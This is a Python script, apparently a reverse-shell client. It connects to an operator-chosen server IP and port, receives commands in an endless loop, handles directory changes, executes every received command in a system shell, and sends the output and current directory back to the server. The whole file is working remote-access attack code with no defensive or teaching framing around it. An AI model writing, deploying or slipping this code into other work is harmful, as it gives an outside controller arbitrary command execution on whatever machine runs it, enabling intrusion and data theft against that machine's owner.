import os
import socket
import subprocess

#replace localhost with server ip
host = '0.0.0.0' 
#set to an uncommon desired value
port = 9898 

s = socket.socket()

#connect to the server socket
s.connect((host, port))

while True:
    #recieve commands from server
    data = s.recv(1024)
    #change directory if command is 'cd'
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))
    #execute commands oonly after passing a length test
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
        output_bytes =  cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes, "utf-8")
        s.send(str.encode(output_str + str(os.getcwd()) + '> '))
        print(output_str)

#Close the freaking Connection
s.close()
